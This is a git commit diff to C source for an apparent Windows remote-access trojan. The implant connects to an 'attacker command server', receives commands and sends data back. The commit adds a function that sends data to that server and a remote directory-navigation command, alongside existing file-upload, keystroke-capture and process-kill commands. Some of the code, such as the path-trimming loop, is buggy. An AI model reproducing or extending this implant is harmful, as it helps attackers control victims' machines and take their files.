b4e22ec05ded860c56c2194cf2cf3859eccbc625
NatAug62 <nataug62@gmail.com>
2020-12-23 23:05:04 -0500

    initial directory traversal

--- remote/main.c
+++ remote/main.c
@@ -1,9 +1,13 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
 
-#include<stdio.h> // standard input/output
-#include<winsock2.h> // windows socket header
+//#include <windows.h> // is this needed?
+#include <winsock2.h> // windows socket header
+#include <shlwapi.h> // useful functions for directory traversal
+#include <stdio.h> // standard input/output
+#include <string.h> // useful string functions
 
 #pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
+#pragma comment(lib, "Shlwapi.lib")
 
 // attacker IP and primary communication port
 #define CMD_SERVER_ADDR "127.0.0.1"
@@ -28,11 +32,95 @@
 #define END_KEYS 14
 // end the process
 #define KILL_PROC 12
+// print the rest of the message to provide useful info
+#define PRINT_INFO 15
+// inform the attacker what the current directory is
+#define NEW_CURR_DIR 16
+
+// define useful globals
+char currDir[MAX_PATH]; // name of the current directory
+SOCKET mainSock; // main socket used to receive commands and send info
 
 // helper function for exiting on error
 void exitOnError() {
 	printf("Exiting program...\n");
 	exit(1);
+}
+
+// helper function to send info messages to the attacker server
+// "code" is the #DEFINE associated with the data being sent
+// assumes that the string passed has a null-terminator
+void sendData(char code, char* data) {
+	printf("Sending data to attacker server...\n");
+	// init local vars
+	int bytesToSend = strlen(data) + 1; // length of data + 1 byte for PRINT_INFO code
+	char* buff = (char*)malloc(bytesToSend);
+	int bytesSent = 0;
+	int retCode;
+	int repeats = 0;
+	// set up the buffer for the first try of sending data
+	ZeroMemory(buff, bytesToSend);
+	buff[0] = code;
+	memcpy((char*)(buff + 1), data, strlen(data));
+
+	printf("Sending the following data:\n");
+	printf("%s\n\n", buff);
+	printf("Strlen: %d\n", strlen(buff));
+	printf("Data len: %d\nData: %s\n", strlen(data), data);
+
+	// loop until all data is sent
+	do {
+		retCode = send(mainSock, buff, strlen(buff), 0);
+		if (retCode == SOCKET_ERROR) {
+			printf("Could not send data: %d\n", WSAGetLastError());
+			exitOnError();
+		}
+		bytesSent += retCode;
+		if (bytesSent < bytesToSend) { // we need to loop again
+			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
+			memmove((char*)(buff + 1), (char*)(buff + bytesSent), bytesToSend - retCode);
+			repeats++;
+		}
+	} while (bytesSent < bytesToSend + repeats);
+	printf("Data has been sent!\n");
+}
+
+/*
+* Change the current directory - used for directory traversal
+* All file and directory related commands will use the current directory as the default location
+*/
+void changeDirectory(char* dirName) {
+	int newLen = strnlen(dirName, 4096);
+	int currLen = strnlen(currDir, MAX_PATH);
+	char buff[MAX_PATH];
+	// check the new path length
+	if (newLen + currLen + 1 > MAX_PATH) {
+		sendData(PRINT_INFO, "Path name is too long!\n\0");
+		return;
+	}
+	// concatenate the strings and check if it's a valid directory
+	memcpy(buff, currDir, MAX_PATH);
+	strcat_s(buff, MAX_PATH, "\\");
+	strcat_s(buff, MAX_PATH, dirName);
+	printf("Checking if \"%s\" is a directory...\n", buff);
+	if (PathIsDirectoryA(buff)) {
+		if (!PathCanonicalizeA(currDir, buff)) {
+			printf("Failed to canonicalize path name \"%s\" with error %d\n\0", buff, GetLastError());
+		} else {
+			printf("Directory exists!\n");
+			sendData(NEW_CURR_DIR, currDir);
+		}
+	} else {
+		sendData(PRINT_INFO, "Directory does not exist!\n\0");
+	}
+}
+
+/*
+* List the contents of the current directory
+* TODO - handle optional argument for directory to list contents of
+*/
+void listDirectoryContents() {
+
 }
 
 /*
@@ -49,10 +137,10 @@ char handleCommand(char* buffer) {
 		for (int i = 1; i < 4096 && buffer[i-1] != '\0'; i++) {
 			buffer[i - 1] = buffer[i]; }
 		printf("Changing to directory %s\n", buffer);
-		//changeDirectory(buffer);
+		changeDirectory(buffer);
 	} else if (cmd == LIST_DIR) { // TODO - complete this later as QoL feature
 		printf("Listing directoy contents\n");
-		//listDirectoryContents();
+		listDirectoryContents();
 	} else if (cmd == DOWNLOAD) {
 		printf("Uploading file to controller\n");
 		// get the port to connect to then shift the buffer to be just the file name
@@ -123,15 +211,14 @@ char handleCommand(char* buffer) {
 * Secondary connections will be set up for streaming other data
 */
 void connectToCommandServer() {
-	SOCKET sock; // TODO - might need to make this global
 	struct sockaddr_in server;
 	int retCode;
 	char cmd;
 	char buffer[4096];
 
 	// create the TCP socket
-	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (sock == INVALID_SOCKET) {
+	mainSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (mainSock == INVALID_SOCKET) {
 		printf("Could not create socket: %d\n", WSAGetLastError());
 		exitOnError();
 	}
@@ -142,7 +229,7 @@ void connectToCommandServer() {
 	server.sin_port = htons(CMD_SERVER_PORT);
 
 	// connect to the attacker command server
-	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
+	if (connect(mainSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
 		printf("Could not connect to command server! Error code: %d\n", WSAGetLastError());
 		exitOnError();
 	} else {
@@ -152,7 +239,7 @@ void connectToCommandServer() {
 	// get and process commands from the attacker
 	do {
 		// get the next command and check for errors or a closed connection
-		retCode = recv(sock, buffer, 4096, 0);
+		retCode = recv(mainSock, buffer, 4096, 0);
 		if (retCode == 0) {
 			printf("Connection closed...\nExiting program...\n");
 			return 0;
@@ -187,7 +274,16 @@ int main(int argc, char* argv[]) {
 		printf("WSAStartup failed with error: %d\n", retCode);
 		exitOnError();
 	}
-	//test();
+	// get the current directory
+	GetModuleFileNameA(NULL, currDir, MAX_PATH);
+	for (int i = MAX_PATH - 1; i >= 0; i--) {
+		if (currDir[i] != '\\' && currDir[i] != '/') {
+			currDir[i] = '\0';
+			break;
+		}
+		currDir[i] = '\0';
+	}
+	printf("Running from \"%s\"\n", currDir);
 	// connect to the command server
 	connectToCommandServer();
 	return 0;
